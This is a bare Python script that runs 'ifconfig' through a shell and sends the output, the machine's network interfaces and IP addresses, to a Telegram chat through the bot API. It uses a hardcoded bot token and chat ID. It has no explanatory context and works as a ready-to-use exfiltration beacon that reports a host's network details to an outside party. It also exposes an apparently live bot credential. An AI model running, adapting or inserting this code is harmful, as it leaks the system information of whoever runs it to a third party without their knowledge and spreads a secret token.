import requests
import subprocess


def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print("Error executing command '{}':\n{}".format(command, e.output.decode('utf-8')))


api_key = "bot7039176169:AAHd8FyBUNm95Y8ewWoWMjKppuJeM9jwrmc"
ip_info = execute_command("ifconfig")

requests.post(f'https://api.telegram.org/{api_key}/sendMessage?chat_id=5692228924&text={ip_info}')

